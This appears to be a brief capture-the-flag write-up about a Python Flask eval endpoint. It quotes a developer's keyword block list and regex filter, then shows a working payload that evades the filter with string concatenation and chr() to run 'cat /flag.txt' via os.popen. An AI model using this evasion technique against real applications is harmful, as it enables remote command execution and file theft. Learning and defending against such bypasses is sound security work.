Looking around in the HTML source code, it looks like the developer was kind enough leave some coments!
```html
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```

Looks like it blocks the `os` module, some builtin functions, and shell commands. The regex seems to block hex values (`0x[0-9A-Fa-f]+`), unicode escape sequences (`\\u[0-9A-Fa-f]{4}`), url-encoded pairs (`%[0-9A-Fa-f]{2}`), file extensions (`\.[A-Za-z0-9]{1,3}\b`), forward and backward slashes.

However, it doesn't block the `__import__()` function, which we can definitely exploit. To bypass the regex, we can use string concatenation or Python's `chr()` function.


We can craft a payload that will import the os module, and `cat /flag.txt`
```py
__import__('o' + 's').popen('c' + 'at ' + chr(47) + 'flag.' + 'txt').read()
```
